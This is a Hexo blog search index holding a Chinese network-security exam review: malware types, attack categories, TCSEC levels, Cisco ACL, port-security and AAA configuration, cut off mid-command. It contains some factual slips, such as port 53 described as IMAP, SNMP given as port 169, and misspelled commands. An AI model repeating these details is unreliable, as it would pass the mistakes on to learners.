<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>网络安全复习</title>
      <link href="/2020/09/08/wang-luo-an-quan-fu-xi/"/>
      <url>/2020/09/08/wang-luo-an-quan-fu-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="网络安全复习"><a href="#网络安全复习" class="headerlink" title="网络安全复习"></a>网络安全复习</h1><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="1-计算机病毒，木马的特点"><a href="#1-计算机病毒，木马的特点" class="headerlink" title="1.计算机病毒，木马的特点"></a>1.计算机病毒，木马的特点</h3><p>病毒的特点：传染性、破坏性、隐蔽性、寄生性。病毒是附着在其他程序上潜在的破坏程序。</p><p>木马：是通过远程控制客户端的木马软件。</p><h3 id="2-网络安全的目标，CIA"><a href="#2-网络安全的目标，CIA" class="headerlink" title="2.网络安全的目标，CIA"></a>2.网络安全的目标，CIA</h3><p>网络安全的目标是保护信息的机密性，完整性，可用性。</p><p>这个概念组成了CIA三元组。</p><p>还有两个概念也有必要加入安全领域，分别是：可靠性，不可抵赖性</p><h3 id="3-网络安全模型，PPDR"><a href="#3-网络安全模型，PPDR" class="headerlink" title="3.网络安全模型，PPDR"></a>3.网络安全模型，PPDR</h3><p>PPDR是美国ISS公司提出的网络安全模型，主要包括：策略、防护、检测和响应。</p><p>策略：安全策略是实现安全防护必须遵守的原则；</p><p>防护：是根据系统可能出出现的安全问题而采取的预防措施，这些措施通过传统的静态安全技术实现；</p><p>检测：当攻击者穿透防护系统时，检测功能就发挥作用，与防护系统形成互补；</p><p>响应：系统一旦检测到入侵，响应系统就开始工作，进行事件处理。</p><h3 id="4-计算机安全防护标准"><a href="#4-计算机安全防护标准" class="headerlink" title="4.计算机安全防护标准"></a>4.计算机安全防护标准</h3><h4 id="1⃣️美国评判标准"><a href="#1⃣️美国评判标准" class="headerlink" title="1⃣️美国评判标准"></a>1⃣️美国评判标准</h4><p>美国国防部计算机安全中心制定的可信任计算机标准准则（TCSEC），即 网络安全橙皮书。</p><p>TCSEC中根据计算机系统所采用的安全策略、系统所具备的安全功能将系统的安全级别从低到高分为四个级别：D类、C类、B类和A类。</p><table><thead><tr><th>类别</th><th>级别</th><th>名称</th><th>主要特征</th></tr></thead><tbody><tr><td>D</td><td>D</td><td>最低安全保护</td><td>没有安全保护</td></tr><tr><td>C</td><td>C1</td><td>自主安全保护</td><td>提供无条件的访问控制策略</td></tr><tr><td></td><td>C2</td><td>有控制的访问保护</td><td>具有访问控制环境能力</td></tr><tr><td>B</td><td>B1</td><td>标记的安全保护结构化</td><td>强制存取控制，安全标记</td></tr><tr><td></td><td>B2</td><td>结构化保护</td><td>面向安全的体系结构，较好的抗渗透能力</td></tr><tr><td></td><td>B3</td><td>安全域</td><td>存取控制、高抗渗透能力</td></tr><tr><td>A</td><td>A</td><td>验证设计</td><td>形式化的设计规范和验证技术</td></tr></tbody></table><p>D级（最小保护）是最低的安全级别，没有任何实际的安全措施，系统软件和硬件都容易被攻击；</p><p>C1级（自主安全保护）是C类的一个安全子级，它描述了一个典型的用在UNIX系统上的安全级别；</p><p>C2级（有控制的访问保护）是C类中安全性较高的一级，除了包括C1级的安全策略与控制外，还增加了系统审计、访问保护和跟踪记录等特性。</p><p>B1级（标记的安全保护）是B类中安全性最低的一级，它是一种需要大量访问控制支持的级别。</p><p>B2级（结构安全保护）是B类中安全性居中的一级，它除了满足B1要求外，还要求计算机系统中所有设备都加标记，并给各设备分配单个或多个安全级别。</p><p>B3级（安全域保护）是B类中安全性最高的一级，它使用安装硬件的方式来加强域的安全。</p><p>A级（验证设计）是当前橙皮书的最高级别，它包含了一个严格的设计、控制和验证过程。</p><h4 id="2⃣️我国评判标准"><a href="#2⃣️我国评判标准" class="headerlink" title="2⃣️我国评判标准"></a>2⃣️我国评判标准</h4><p>《计算机信息系统安全保护等级划分准则》，编号为GB17859-1999，一共五级</p><p>第一级为用户自主保护级（GB1安全级）：他的安全保护机制使用户具备自主安全保护的能力，保护用户的信息免受非法的读写破坏。</p><p>第二级为系统审计保护级（GB2安全级）：除了继承前一个级别的安全功能外，还要求创建和维护访问的审计跟踪记录，使所有用户对自己行为的合法性负责。</p><p>第三级为安全标记保护级（GB3安全级）：除了继承前一个级别的安全功能外，还要求以访问对象标记的安全级别限制访问着的访问权限，实现对访问对象的强制保护。</p><p>第四级为结构化保护级（GB4安全级）：在继承前面安全级别安全功能的基础上，将安全保护机制划分为关键部分和非关键部分，对关键部分直接控制访问着对访问对象的存取，从而加强系统的抗渗透能力。</p><p>第五级为访问验证保护级（GB5安全级）：这一个级别特别增设了访问验证功能，负责仲裁访问者对访问对象的所有访问活动。</p><h3 id="5-网络攻击，如拒绝服务攻击有哪些？"><a href="#5-网络攻击，如拒绝服务攻击有哪些？" class="headerlink" title="5.网络攻击，如拒绝服务攻击有哪些？"></a>5.网络攻击，如拒绝服务攻击有哪些？</h3><p>在网络中主要有以下四种攻击方法：</p><h4 id="侦查攻击："><a href="#侦查攻击：" class="headerlink" title="侦查攻击："></a>侦查攻击：</h4><h5 id="扫描攻击："><a href="#扫描攻击：" class="headerlink" title="扫描攻击："></a>扫描攻击：</h5><p>侦查攻击的最常见类型是扫描攻击。当攻击者扫描网络中的主机时网络扫描攻击会发生。攻击者通常用ping扫描目标网络已确定哪些IP地址是活跃的。之后，在使用端口扫描器确定在某个活跃的IP上哪些网络服务或端口是活跃的。利用这些信息，入侵者可知道目标主机的操作系统类型和版本，并由此来判断是否存在可以用来攻击的弱点。</p><h5 id="窃听攻击："><a href="#窃听攻击：" class="headerlink" title="窃听攻击："></a>窃听攻击：</h5><p>窃听是当数据包在源和目的的设备之间传输时检查数据包的过程。攻击者通常使用协议分析器执行窃听。</p><h4 id="访问攻击："><a href="#访问攻击：" class="headerlink" title="访问攻击："></a>访问攻击：</h4><h5 id="密码攻击："><a href="#密码攻击：" class="headerlink" title="密码攻击："></a>密码攻击：</h5><p>密码攻击时指攻击者试图猜测系统密码。密码攻击可使用暴力攻击、木马程序、IP欺骗和数据包嗅探等方式实现。</p><h5 id="信任攻击："><a href="#信任攻击：" class="headerlink" title="信任攻击："></a>信任攻击：</h5><p>信任利用时指攻击者利用网络中的信任关系而进行的攻击。</p><h5 id="端口重定向："><a href="#端口重定向：" class="headerlink" title="端口重定向："></a>端口重定向：</h5><p>端口重定向利用被控制的主机作为跳板来对其他目标进行攻击，是信任利用攻击的一种类型。入侵工具被安装到被控制的主机上已进行会话重定向。</p><h5 id="中间人攻击："><a href="#中间人攻击：" class="headerlink" title="中间人攻击："></a>中间人攻击：</h5><p>中间人攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情。攻击者位于两个合法实体间通信的中间位置，并有权访问网络中传输的数据包，以读取或修改双方传递的数据。这种攻击经常使用网络数据包嗅探器及路由、传输协议来实现。</p><h5 id="缓冲区溢出："><a href="#缓冲区溢出：" class="headerlink" title="缓冲区溢出："></a>缓冲区溢出：</h5><p>缓冲区溢出攻击可以归类于DOS攻击，也可以归类于访问攻击。其原因是缓冲区溢出可以导致网络设备中的操作系统崩溃从而导致拒绝服务；也可以被更加高明的攻击者用来获取操作系统权限，而不仅仅只是导致拒绝服务攻击。</p><h4 id="拒绝服务攻击："><a href="#拒绝服务攻击：" class="headerlink" title="拒绝服务攻击："></a>拒绝服务攻击：</h4><h5 id="死亡之ping："><a href="#死亡之ping：" class="headerlink" title="死亡之ping："></a>死亡之ping：</h5><p>根据RFC791可以知道，最大的IP分组长度可以达到65535个字节，其中IP头部的长度在不指定IP可选择的情况下一般为20个字节。但是，传输于线路中的分组的实际大小是由IP MTU决定的，对以太网段而言它是1500个字节。通过1500个字节的分组都会被分成小的IP分组，使其不超过IPMTU的大小。</p><h5 id="TCP-SYN泛洪攻击："><a href="#TCP-SYN泛洪攻击：" class="headerlink" title="TCP SYN泛洪攻击："></a>TCP SYN泛洪攻击：</h5><p>它的执行是通过向服务器发送大量的TCP SYN分组来实现。TCP SYN泛洪攻击也被称为半开的SYN攻击。</p><h4 id="病毒、木马和蠕虫："><a href="#病毒、木马和蠕虫：" class="headerlink" title="病毒、木马和蠕虫："></a>病毒、木马和蠕虫：</h4><h5 id="病毒："><a href="#病毒：" class="headerlink" title="病毒："></a>病毒：</h5><p>计算机病毒是能够通过修改而达到感染其他程序的一段软件；这种修改操作包括在原始程序中注入能够复制病毒程序的程序，而这种病毒程序又能够感染其他程序。</p><p>计算机病毒包括三个部分：</p><p>感染机制：病毒传播的方法，能使病毒复制；</p><p>触发：决定有效载荷被激活或传递的条件或事件；</p><p>有效载荷：除了传播外，病毒要做的事情。</p><p>可以采取以下操作在一定程度上降低病毒成功攻击的次数：</p><p>检测：一旦病毒感染系统，系统就应该确定这一事实并对病毒进行定位；</p><p>识别：检测到病毒后，应该能够识别被感染的程序中的病毒类型；</p><p>清除：病毒被识别后，对病毒所感染的程序所有可能发生的变化进行检查，清除病毒并使程序还原到感染前的状态，并清除所有被感染系统中的病毒从而使其无法继续传播。</p><h5 id="木马："><a href="#木马：" class="headerlink" title="木马："></a>木马：</h5><p>木马看起来像是某个应用程序，而实际上是一个攻击工具。它包含隐秘代码段，一旦被调用，将会执行一些不想要或有害的功能。木马可以间接完成一些未授权用户无法直接完成的工作。木马的另一个动机是破坏数据。</p><h5 id="蠕虫："><a href="#蠕虫：" class="headerlink" title="蠕虫："></a>蠕虫：</h5><p>蠕虫是一种特别危险的恶意代码，它们独立的利用网络中的漏洞复制自己。病毒需要有宿主程序才能运行，而蠕虫可以自主运行。它们不需要用户参与，能够以极快的速度传播网络。蠕虫通常会使网络速度下降。</p><p>大多数蠕虫攻击存在如下三个主要组成部分：</p><p>启动漏洞：蠕虫在易受攻击的系统上利用漏洞机制安装自身；</p><p>传播机制：进入设备后，蠕虫复制自身并定位新目标；</p><p>有效载荷：任何能导致某些行为的恶意代码。大多数情况下用于在被感染的逐句上创建一个后门。</p><p>蠕虫是自包含程序，他攻击一个系统以利用已知的漏洞。一旦利用成功，蠕虫将自身从攻击主机复制到新的被利用的系统，开始新的循环。</p><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="1-访问路由器的方法及特点"><a href="#1-访问路由器的方法及特点" class="headerlink" title="1.访问路由器的方法及特点"></a>1.访问路由器的方法及特点</h3><p>（1）控制台端口(console端口)；</p><p>（2）辅助端口(AUX端口)；</p><p>（3）Telnet(VTY端口)；</p><p>（4）超文本传输协议(HTTP)；</p><p>（5）使用安全套接层的HTTP(HTTPS)；</p><p>（6）安全Shell(SSH)；</p><p>（7）简单网络管理协议(SNMP)。</p><h3 id="2-常见的应用服务端口"><a href="#2-常见的应用服务端口" class="headerlink" title="2.常见的应用服务端口"></a>2.常见的应用服务端口</h3><table><thead><tr><th>21/20</th><th>FTP</th><th>FTP服务所开放的端口，用于上传、下载文件。</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>SSH端口，用于通过命令行模式或远程连接软件（例如PuTTY、X设立了、SecureCRT等）连接Linux实例。详情请参考使用用户名密码验证连接Linux实例。</td></tr><tr><td>23</td><td>Telnet</td><td>Telnet端口，用于Telnet远程登录ECS实例</td></tr><tr><td>25</td><td>SMTP</td><td>SMTP服务所开放的端口，用于发送邮件。基于安全考虑，ECS实例25端口默认受限，如需解封，请参考TCP25端口控制台解封申请。</td></tr><tr><td>80</td><td>HTTP</td><td>用于HTTP服务提供访问功能，例如，IIS、Apache、Nginx等服务。<br>如何排查80端口故障，请参见检查TCP80端口是否正常工作。</td></tr><tr><td>110</td><td>POP3</td><td>用于POP3协议，POP3时电子邮件收发的协议。</td></tr><tr><td>53</td><td>DNS</td><td>用于IMAP协议，IMAP是用于电子邮件的接收的协议。</td></tr><tr><td>443</td><td>HTTPS</td><td>用于HTTPS服务提供访问功能。HTTPS是一种能提供加密和通过安全端口传输的一种协议。</td></tr></tbody></table><h3 id="3-建立本地用户，密码（五类、七类），特权密码（五类、七类），应用到端口"><a href="#3-建立本地用户，密码（五类、七类），特权密码（五类、七类），应用到端口" class="headerlink" title="3.建立本地用户，密码（五类、七类），特权密码（五类、七类），应用到端口"></a>3.建立本地用户，密码（五类、七类），特权密码（五类、七类），应用到端口</h3><h3 id="4-SSH方式访问路由的配置和特点"><a href="#4-SSH方式访问路由的配置和特点" class="headerlink" title="4.SSH方式访问路由的配置和特点"></a>4.SSH方式访问路由的配置和特点</h3><h2 id="第三章ACL"><a href="#第三章ACL" class="headerlink" title="第三章ACL"></a>第三章ACL</h2><h3 id="1-标准ACL"><a href="#1-标准ACL" class="headerlink" title="1.标准ACL"></a>1.标准ACL</h3><p>标准ACL只能通过源IP地址制定需要放行和阻塞的流量。</p><p>用编号定义的标准ACL的命令格式如下：</p><pre><code>Router(config)#access-list access-list-number {permit|deny} source [source-wildcard] [log]</code></pre><p>其中的参数如下：</p><p>Access-list-number：是访问控制列表的编号，标准访问控制列表的规定编号范围时1～99或1300～1999。</p><p>关键字permit和deny：用来表示满足访问表项的数据包是允许通过还是要过滤掉。关键字permit表示允许数据包通过，而关键字deny表示数据包要被丢弃掉。</p><p>source：表示源地址，对于标准的IP访问控制列表，源地址是主机或一组主机IP地址。</p><p>source-wildcard：表示源地址的通配符掩码，把对应于地址位中将要被准确匹配的位设置为0，把不关心的位设置为1.</p><p>log：使用关键字log可以生成一个信息日志消息。该设备会把所有和该ACL相匹配的数据包以日志的形式发送给console接口、缓存或系统日志服务器。</p><h3 id="2-扩展ACL"><a href="#2-扩展ACL" class="headerlink" title="2.扩展ACL"></a>2.扩展ACL</h3><p>扩展AC了可以基于源IP地址、目的IP地址、指定协议、端口号和标记（flag）等对流量实施过滤。配置命令如下：</p><pre><code>Router(config)#access-list access-list-number {permit | deny} protocol source source-wild-card [operator port] destinatiion-wildcard [operator port] [precedence precdence] [dscp value] [tos tos] [log | log-input] [fragments] [established]</code></pre><p>其中的参数如下：</p><p>access-list-number：是访问控制列表的编号，用来标识一个扩展的访问控制列表。扩展访问控制列表的规定标号范围时100～199或2000～2699.</p><p>关键字permit和deny：用来表示满足访问表项的数据是允许通过还是要过滤掉。</p><p>protocol：是一个新变量，它可以在IP包头的协议字段寻找匹配，可选择的关键字是eigrp、gre、icmp、igrp、ip、nos、ospf、tcp和udp。还可以使用0～255种的一个整数表示IP协议号。ip是一个通用的关键字，它可以匹配任意和所有的IP协议。</p><p>source和source-wildcard：表示源地址和源地址的通配符掩码。</p><p>destination和desttination-wildcard：表示目的地址和目的地址的通配符掩码。在扩展访问控制列表中，数据包的源地址和目的地址都将被检查。</p><p>operator：指定的逻辑操作。选项可以是eq(等于)、neq(不等于)、gt(大于)、lt(小于)和range(指定包括的端口范围)。如果使用range运算符，那么要指定两个端口号。</p><p>port：指明被匹配的应用层端口号。几个常用的端口号是Telnet（23）、FTP（20和21）、HTTP（80）和SMTP（25）和SNMP（169）。完整的端口号列表参见RFC1700.</p><p>precedence：IP数据包头的这个域通常用来为服务质量保证和队列的目的进行流量分类。在ACL中可以通过这个参数过滤特定的优先级。</p><p>dscp：DSCP（区分服务代码点）用于通过区分流量的优先级次序来实施QoS。通过使用的奢侈品这个参数管理员可以根据IP数据包头中的DSCP值来进行过滤。</p><p>tos：使用该参数可以过滤IP数据包头中服务类型域。</p><p>log：该参数用来将符合条件的匹配记录到已经打开的日志记录设备（控制台、内部缓存或系统日志服务器）。</p><p>log-input：使用该参数可以记录的信息包括接收到数据包的输入接口和数据包中的第二层源地址，如Ethernet MAC地址、帧中继的DLCI号或者ATM VC号。</p><p>fragments：该关键字用来过滤分片。</p><p>established：使用这个关键字可以检查TCP数据包汇总是否有确认（ACK）和复位（RST）位。</p><h3 id="3-命名ACL"><a href="#3-命名ACL" class="headerlink" title="3.命名ACL"></a>3.命名ACL</h3><p>命名的访问控制列表仅仅是创建标准访问控制列表和扩展访问控制列表的另一种方法。命令格式如下：</p><pre><code>Router(config)#ip accss-list standard access-list-name标准ACL的配置：Router(config-std-nacl)#{deny | permit} source [source-wildcard] [log]扩展ACL的配置：Router(config-ext-nacl)#{deny | permit} protocol source source-wildcard [operator port] destination destination-wildcard [operator port] [precedence precedence] [dscp value] [tos tos] [log | log-input] [fragments] [established]</code></pre><p>命名的访问控制列表的优点在于它支持描述性名称，可以单独地添加和删除列表中的一条语句，从而克服了标号的访问控制列表不能增量更新、难以维护的弊端。</p><h3 id="4-如何查看路由器中配置的ACL"><a href="#4-如何查看路由器中配置的ACL" class="headerlink" title="4.如何查看路由器中配置的ACL"></a>4.如何查看路由器中配置的ACL</h3><pre><code>show access-lists</code></pre><h3 id="5-自反ACL的配置方法"><a href="#5-自反ACL的配置方法" class="headerlink" title="5.自反ACL的配置方法"></a>5.自反ACL的配置方法</h3><p>自反ACL（Reflexive ACL，RACL）支持基于高层的会话信息来实施IP数据包的过滤功能。自反ACL一般用于放行出站流量，同时限制抵达内部路由器的入站流量。自反ACL提供了一种真正意义上的单向访问控制，它是自动驻留的、暂时的、基于会话的过滤器。</p><p>配置路由器来使用RACL需要以下三个步骤：</p><p>步骤1:建立内部命名的扩展ACL；</p><p>步骤2:建立外部命名的扩展ACL；</p><p>步骤3:在接口上应用ACL。</p><p>例：</p><pre><code>//以下命令用来配置RACL以追踪流量Router(config)#ip access-list extended Internal-ACLRouter(config-ext-nacl)#permit tcp 192.1.1.0 0.0.0.255 any eq 80 reflect RACLRouter(config)#exit//以下命令用来引用RACLRouter(config)#ip access-list extended External-ACLRouter(config-ext-nacl)#evaluate RACLRouter(config-ext-nacl)#deny ip any anyRouter(config-ext-nacl)#exit//以下命令用来把配置的ACL应用到路由器接口上Router(config)#int f0/0Router(config-if)#ip access-group Internal-ACL inRouter(config-if)#exitRouter(config)#int s1/0Router(config)#ip access-group External-ACL inRouter(config)#exit</code></pre><p>企业本部对访问外部网络做出限制，现允许本部人员在周一至周五上班时间10：00-15：00（NETTIME）通过TCP、ICMP协议访问Internet网络，且不允许Internet用户访问内部网络。拟采用自反ACL实现上述功能</p><pre><code>1） 定义时间段R1(config)#time-range NETTIME  R1(config-time-range)#periodic weekdays 9:00 to 17:00R1(config-time-range)#exit2） 定义基于时间的ACL Router(config)# ip access-list extended ACL01 Router(config-acl)# permit tcp 172.16.10.0 0.0.0.255 any time-range NETTIME reflect RTCP Router(config-acl)# permit icmp 172.16.10.0 0.0.0.255  any time-range NETTIME reflect RICMP  Router(config)# ip access-list extended ACL02 Router(config-acl)#evaluate RTCPRouter(config-acl)#evaluate RICMP3） 调用ACL  R1(config)#int  S0/0R1(config-if)#ip access-group ACL01 outR1(config-if)# ip access-group ACL02 inR1(config-if)#end</code></pre><h2 id="第四章-局域网交换机安全"><a href="#第四章-局域网交换机安全" class="headerlink" title="第四章 局域网交换机安全"></a>第四章 局域网交换机安全</h2><h3 id="1-局域网中二层攻击种类"><a href="#1-局域网中二层攻击种类" class="headerlink" title="1.局域网中二层攻击种类"></a>1.局域网中二层攻击种类</h3><p>MAC地址表已出攻击；</p><p>MAC地址欺骗攻击；</p><p>VLAN攻击；</p><p>STP操作攻击；</p><p>LAN风暴攻击；</p><p>DHCP攻击；</p><p>ARP攻击。</p><h3 id="2-对局域网中的STP协议进行防护的措施"><a href="#2-对局域网中的STP协议进行防护的措施" class="headerlink" title="2.对局域网中的STP协议进行防护的措施"></a>2.对局域网中的STP协议进行防护的措施</h3><h4 id="配置端口安全"><a href="#配置端口安全" class="headerlink" title="配置端口安全"></a>配置端口安全</h4><h5 id="步骤一-：配置端口为接入端口"><a href="#步骤一-：配置端口为接入端口" class="headerlink" title="步骤一 ：配置端口为接入端口"></a>步骤一 ：配置端口为接入端口</h5><pre><code>Switch(config-if)#switchport mode access</code></pre><h5 id="步骤二：使用switchport-port-security在端口上启用端口安全"><a href="#步骤二：使用switchport-port-security在端口上启用端口安全" class="headerlink" title="步骤二：使用switchport port-security在端口上启用端口安全"></a>步骤二：使用switchport port-security在端口上启用端口安全</h5><pre><code>Switch(config-if)#swithcport port-security</code></pre><h5 id="步骤三：为端口设置安全MAC地址的最大数"><a href="#步骤三：为端口设置安全MAC地址的最大数" class="headerlink" title="步骤三：为端口设置安全MAC地址的最大数"></a>步骤三：为端口设置安全MAC地址的最大数</h5><pre><code>Switch(config-if)#switchport port-security maximum value</code></pre><h5 id="步骤四：配置处理违例的方法"><a href="#步骤四：配置处理违例的方法" class="headerlink" title="步骤四：配置处理违例的方法"></a>步骤四：配置处理违例的方法</h5><pre><code>Switch(config-if)#switchport port-security violation {protect | restrict | shutdown}</code></pre><h5 id="步骤五：配置安全端口上的安全地址"><a href="#步骤五：配置安全端口上的安全地址" class="headerlink" title="步骤五：配置安全端口上的安全地址"></a>步骤五：配置安全端口上的安全地址</h5><pre><code>Switch(config-if)#switchport port-security mac-address {mac-address | sticky}</code></pre><h5 id="步骤六：配置安全地址的老化时间"><a href="#步骤六：配置安全地址的老化时间" class="headerlink" title="步骤六：配置安全地址的老化时间"></a>步骤六：配置安全地址的老化时间</h5><pre><code>Switch(config-if)#swtichport port-securit aging {static | time aging-time}</code></pre><h4 id="配置VLAN中继安全"><a href="#配置VLAN中继安全" class="headerlink" title="配置VLAN中继安全"></a>配置VLAN中继安全</h4><pre><code>Switch(config-if)#switchport mode trunkSwitch(config-if)#switchport nonegotiateSwitch(config-if)#switchport trunk native vlan 400</code></pre><h4 id="配置BPDU防护、BPDU过滤和根防护"><a href="#配置BPDU防护、BPDU过滤和根防护" class="headerlink" title="配置BPDU防护、BPDU过滤和根防护"></a>配置BPDU防护、BPDU过滤和根防护</h4><p>为了缓解STP操纵攻击，可以启用Port Fast、BPDU防护、BPDU过滤和根防护等STP增强命令。</p><h5 id="1-Port-Fast"><a href="#1-Port-Fast" class="headerlink" title="1.Port Fast"></a>1.Port Fast</h5><pre><code>Switch(config)#int f0/10Switch(config-if)#switchport mode accessSwitch(config-if)#spanning-tree portfast</code></pre><h5 id="2-BPDU防护"><a href="#2-BPDU防护" class="headerlink" title="2.BPDU防护"></a>2.BPDU防护</h5><pre><code>在全局模式下，输入spanning-tree portfast bpduguard default可以在所有启用了Port Fast特性的端口上启用BPDU防护功能；在接口模式下，输入spanning-tree portfast bpduguard enable可以在没有启用Port Fast特性的端口上启用BPDU防护功能。</code></pre><h5 id="3-BPDU过滤"><a href="#3-BPDU过滤" class="headerlink" title="3.BPDU过滤"></a>3.BPDU过滤</h5><p>在全局级别，可以使用spanning-tree portfast bpdufilter default全局配置命令在启用了Port Fast的接口上启用BPDU过滤。</p><p>在接口级别，可以使用spanning-tree bpdufilter enable接口配置命令在任意接口上启用BPDU过滤，而且无需启用Port Fast特性。</p><h5 id="4-根防护"><a href="#4-根防护" class="headerlink" title="4.根防护"></a>4.根防护</h5><p>在端口上配置根防护的命令如下：</p><pre><code>Switch(config-if)#spanning-tree guard root</code></pre><p>为了检验根防护，使用</p><pre><code>show spanning-tree inconsistentports</code></pre><h3 id="3-镜像端口"><a href="#3-镜像端口" class="headerlink" title="3.镜像端口"></a>3.镜像端口</h3><p>端口镜像（port Mirroring）功能通过在交换机或路由器上，将一个或多个源端口的数据流量转发到某一个指定端口来实现对网络的监听，指定端口称之为“镜像端口”或“目的端口”，在不严重影响源端口正常吞吐流量的情况下，可以通过镜像端口对网络的流量进行监控分析。</p><h3 id="4-交换机端口安全防护"><a href="#4-交换机端口安全防护" class="headerlink" title="4.交换机端口安全防护"></a>4.交换机端口安全防护</h3><p>端口安全可以防止MAC地址欺骗、MAC地址溢出。</p><h4 id="违例的三种方式："><a href="#违例的三种方式：" class="headerlink" title="违例的三种方式："></a>违例的三种方式：</h4><p>配置完端口安全以后，当违例产生时，可以设置针对违例的处理方式为：</p><p>protect：但安全MAC地址数超过端口上配置的最大安全MAC地址 数是，位置源MAC地址的包将被丢弃，直至MAC地址表中的安全MAC地址数降到所配置的最大安全MAC地址数以内，或者增加最大安全MAC地址数。这种行为没有安全违例行为发生通知。</p><p>restrict：与前面的保护模式差不多，也是在安全MAC地址数达到端口上配置的最大安全MAC地址数时，位置源MAC地址的包将被丢弃，直到MAC地址表中的安全MAC地址数降到所配置的最大安全MAC地址数以内，或者增加最大安全MAC地址数。但这种行为模式会有一个SNMP Trap报文发送。</p><p>shutdown：当违例场盛事，端口立即呈现错误（error-disabled）状态，交换机将丢弃接收到的帧（MAC地址不在安全地址表中），同时也会发送一个SNMP Trap报文，而且关闭端口（端口指示灯熄灭）。</p><p>当端口处于违例操作而进入“error-disabled”状态后，端口将被关闭，并丢弃所有报文，需要在全局模式下使用命令errdisabled recovery cause security-violation 手工将其恢复为UP状态，或者使用errdisable recovery interval time命令设置超时时间间隔，此时间间隔过后，端口将自动被启用。</p><h2 id="第五章-AAA技术"><a href="#第五章-AAA技术" class="headerlink" title="第五章 AAA技术"></a>第五章 AAA技术</h2><h3 id="1-AAA技术的定义"><a href="#1-AAA技术的定义" class="headerlink" title="1.AAA技术的定义"></a>1.AAA技术的定义</h3><p>AAA是一个综合的安全架构，和其他一些安全技术配合使用，可以提升网络和设备的安全性。</p><p>AAA服务可以同时对能够访问网络设备的用户，及这些用户能够访问的服务进行控制。</p><h4 id="AAA的安全服务"><a href="#AAA的安全服务" class="headerlink" title="AAA的安全服务"></a>AAA的安全服务</h4><h5 id="1-认证"><a href="#1-认证" class="headerlink" title="1.认证"></a>1.认证</h5><p>认证功能可以通过用户当前的有效数字证书来识别哪些用户是合法用户，从而让这些合法用户可以访问网络资源，数字证书可以是用户名和密码。</p><h5 id="2-授权"><a href="#2-授权" class="headerlink" title="2.授权"></a>2.授权</h5><p>授权功能能够在用户通过认证并获取到网络访问权限之后，进一步执行网络资源的安全策略。授权可以提供额外的优先级控制能力，如更新机遇每个用户的ACL，或分配IP地址信息。</p><h5 id="3-统计"><a href="#3-统计" class="headerlink" title="3.统计"></a>3.统计</h5><p>统计功能可以收集并向安全服务器发送能够用来进行计费、审计和回报的信息，如未登录用户进行核对的用户信息，用户登录的起始和结束时间，用户使用过的IOS命令，流量的相关信息，如传输和接收到的数据包数或字节数等。</p><h3 id="2-Tacasc-协议与Radius协议。"><a href="#2-Tacasc-协议与Radius协议。" class="headerlink" title="2.Tacasc+协议与Radius协议。"></a>2.Tacasc+协议与Radius协议。</h3><p>Radius是一个分布式C/S协议，它能够使网络不受非法访问流量的侵蚀。</p><p>Tacasc+是AAA体系中最常见的安全协议，它可以对打算访问网络设备的用户提供中心化的认证功能。TACASC+提供的AA服务采用了模块化的方式。将三种服务分开是AAA安全模型架构的基础。</p><table><thead><tr><th></th><th>Radius</th><th>Tacacs+</th></tr></thead><tbody><tr><td>AAA功能</td><td>认证和授权和用一个数据包，统计使用单独的数据包，因此在实施过过程中其灵活性不好。</td><td>按照AAA的架构分离AAA各项功能，三项服务都是用单独的数据包，允许模块化地配置安全服务器</td></tr><tr><td>传输协议</td><td>使用UDP1812/1813端口，网络传输效率更高</td><td>使用TCP49端口，网络传输更可靠</td></tr><tr><td>质询/响应</td><td>支持从RADIUS安全服务器到RADIUS客户端的单项质询和响应</td><td>支持双向质询和响应，类似两个NAS之间使用的CHAP</td></tr><tr><td>支持的协议</td><td>不支持NetBEUT</td><td>支持所有协议</td></tr><tr><td>安全性</td><td>只加密数据包中的密码</td><td>加密整个数据包</td></tr><tr><td>定制化</td><td>欠缺灵活，因此许多特性只能与TACACS+一起使用</td><td>比较灵活，允许每个用户定制自己的用户名和密码提示信息</td></tr><tr><td>验证过程</td><td>用户配置文件内容的所有应答属性都发送到NAS。NAS根据接收到的属性接受或者拒绝验证请求</td><td>根据用户的配置文件内容，服务器接受或者拒绝验证请求。客户端或者NAS不知道用用户配置文件的具体内容</td></tr><tr><td>统计</td><td>能够包括比TACACS+更多的统计记录信息，这是RADIUS强于TACACS+的一个主要方面</td><td>包括有限数量的信息字段</td></tr><tr><td>路由器管理</td><td>不允许用户控制在路由器上哪些命令可以被执行</td><td>提供两种方法控制对路由器命令的验证，基于每个用户或基于每个组</td></tr></tbody></table><h3 id="3-AAA认证和授权的配置方法。"><a href="#3-AAA认证和授权的配置方法。" class="headerlink" title="3.AAA认证和授权的配置方法。"></a>3.AAA认证和授权的配置方法。</h3><h4 id="配置AAA认证"><a href="#配置AAA认证" class="headerlink" title="配置AAA认证"></a>配置AAA认证</h4><h5 id="1⃣️在全局模式下使用命令aaa-new-model来启用AAA服务"><a href="#1⃣️在全局模式下使用命令aaa-new-model来启用AAA服务" class="headerlink" title="1⃣️在全局模式下使用命令aaa new-model来启用AAA服务"></a>1⃣️在全局模式下使用命令aaa new-model来启用AAA服务</h5><pre><code>Router(config)#aaa new-model</code></pre><h5 id="2⃣️配置网络设备和AAA服务器之间的通信"><a href="#2⃣️配置网络设备和AAA服务器之间的通信" class="headerlink" title="2⃣️配置网络设备和AAA服务器之间的通信"></a>2⃣️配置网络设备和AAA服务器之间的通信</h5><p>如果AAA服务使用的是本地数据库，就可以跳过这一步。如果将使用AAA服务器，那么路由器必须设置与RADIUS服务器或TACACAS+服务器的通信，如共享密钥和RADIUS服务器或TACACS+服务器的IP地址。在路由器上配置RADIUS服务器（或TACACS+服务器）的IP地址及共享密钥的命令格式如下：</p><pre><code>Router(config)#radius-server key keystringRouter(config)#radius-server host ip-address或Router(config)#tacacs-server key keystringRouter(config)#tacacs-server host ip-address</code></pre><h5 id="3⃣️使用aaa-authentication命令集定义认证服务和认证方法列表"><a href="#3⃣️使用aaa-authentication命令集定义认证服务和认证方法列表" class="headerlink" title="3⃣️使用aaa authentication命令集定义认证服务和认证方法列表"></a>3⃣️使用aaa authentication命令集定义认证服务和认证方法列表</h5><p>在路由器上配置认证服务和方法列表的命令格式如下：</p><pre><code>Router(config)#aaa authentication {login | enable | ppp arap} {default | list-name} method1 